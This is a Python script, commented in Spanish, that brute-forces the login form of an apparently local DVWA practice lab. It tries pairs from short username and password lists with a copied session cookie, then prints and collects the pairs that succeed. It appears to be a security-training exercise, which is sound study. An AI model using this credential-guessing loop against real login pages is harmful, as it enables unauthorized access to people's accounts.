import requests
import time

# Definir sesión
session = requests.Session()

# Usar cookie válida copiada desde el navegador
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0.0.0 Safari/537.36",
    "Referer": "http://localhost:4280/vulnerabilities/brute/",
    "Cookie": "PHPSESSID=1f60040512d0a2080c6c6534e888405a; security=low"
}

usuarios = ["admin", "smithy", "gordonb", "1337", "pablo", "random"]
passwords = ["password", "abc123", "charley", "letmein"]

resultados_validos = []

print("Iniciando ataque...\n")
start = time.time()

for usuario in usuarios:
    for clave in passwords:
        params = {
            "username": usuario,
            "password": clave,
            "Login": "Login"
        }

        response = session.get("http://localhost:4280/vulnerabilities/brute/", headers=headers, params=params)

        print("=" * 60)
        print(f"Intento: {usuario}:{clave}")
        print(f"Código de respuesta: {response.status_code}")
        print(f"Tamaño contenido: {len(response.text)}")
        print("Resumen de contenido:")
        print(response.text[:400])  # ver primeras líneas
        print("=" * 60 + "\n")

        if "Welcome to the password protected area" in response.text:
            print(f"[Válido] {usuario}:{clave}\n")
            resultados_validos.append((usuario, clave))

end = time.time()

print("Pares válidos encontrados:")
for u, p in resultados_validos:
    print(f"{u}:{p}")

print(f"Tiempo total: {end - start:.2f} segundos")
